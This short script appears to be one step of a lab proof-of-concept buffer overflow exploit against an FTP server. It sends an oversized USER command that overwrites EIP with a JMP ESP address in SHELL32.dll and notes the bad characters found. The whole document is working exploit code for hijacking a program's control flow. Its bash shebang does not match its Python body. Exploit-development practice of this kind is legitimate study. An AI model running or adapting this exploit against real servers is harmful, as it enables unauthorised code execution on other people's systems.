#!/bin/bash
import socket

# Part 6 of proof of concept by Vry4n
# This script is intended full the buffer, modify EIP value with our JMP ESP value 7CB32F34, which refers to SHELL32.dll
# execute it, and then fill with Cs

# badchars \x0a\x0d\xc0
# JMP ESP 0x7CB32F34, as this is intel processor this is read as little endian, see EIP variable
FUZZ = "A" * 230
EIP = b"\x34\x2F\xB3\x7C"
junk = "C" * 500


print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 21))
s.recv(1024)
s.send(b"USER " + FUZZ.encode() + EIP + junk.encode() + b"\r\n")
s.close()
